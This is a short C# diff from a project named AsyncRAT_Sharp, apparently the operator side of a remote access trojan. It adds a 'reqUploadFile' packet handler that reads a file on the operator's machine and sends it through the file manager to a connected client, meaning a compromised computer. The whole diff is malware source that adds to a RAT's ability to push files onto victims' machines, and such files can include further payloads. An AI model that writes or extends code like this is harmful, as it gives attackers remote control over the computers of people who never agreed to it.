@@ -8,6 +8,7 @@ using System.Windows.Forms;
 using System.Threading;
 using System.Threading.Tasks;
 using AsyncRAT_Sharp.Helper;
+using System.Diagnostics;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
@@ -108,8 +109,31 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             }
                             break;
                         }
-                }
 
+                    case "reqUploadFile":
+                        {
+                            if (Program.form1.InvokeRequired)
+                            {
+                                Program.form1.BeginInvoke((MethodInvoker)(async () =>
+                                {
+                                    FormDownloadFile FD = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
+                                    if (FD != null)
+                                    {
+                                        FD.C = client;
+                                        FD.timer1.Start();
+                                        MsgPack msgpack = new MsgPack();
+                                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                                        msgpack.ForcePathObject("Command").AsString = "uploadFile";
+                                        await msgpack.ForcePathObject("File").LoadFileAsBytes(FD.fullFileName);
+                                        msgpack.ForcePathObject("Name").AsString = FD.clientFullFileName;
+                                        ThreadPool.QueueUserWorkItem(FD.Send, msgpack.Encode2Bytes());
+                                    }
+                                }));
+                            }
+                            break;
+                        }
+
+                }
             }
             catch { }
         }
